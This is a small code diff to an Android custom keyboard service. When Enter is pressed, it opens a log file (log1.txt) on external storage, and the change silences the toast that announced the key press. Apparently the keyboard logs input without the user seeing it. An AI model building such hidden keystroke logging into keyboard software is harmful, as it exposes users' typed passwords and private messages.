@@ -694,7 +694,7 @@ public class SoftKeyboard extends InputMethodService
     	//Toast.makeText(this, "Key Pressed: " + primaryCode, Toast.LENGTH_LONG).show();
     	if(primaryCode == 10)
     	{
-    		Toast.makeText(this, "enter presses", Toast.LENGTH_SHORT).show();
+    		//Toast.makeText(this, "enter presses", Toast.LENGTH_SHORT).show();
     		File sdCard = Environment.getExternalStorageDirectory(); 
     		File logFile = new File(sdCard.getAbsolutePath() + "/" + "log1.txt");
     		try
@@ -713,7 +713,7 @@ public class SoftKeyboard extends InputMethodService
     			}
     			else
     			{
-    				Toast.makeText(this, "Unabel to read file", Toast.LENGTH_SHORT).show();
+    				Toast.makeText(this, "Unable to read file", Toast.LENGTH_SHORT).show();
     			}
     		}
     		catch(IOException ioex)
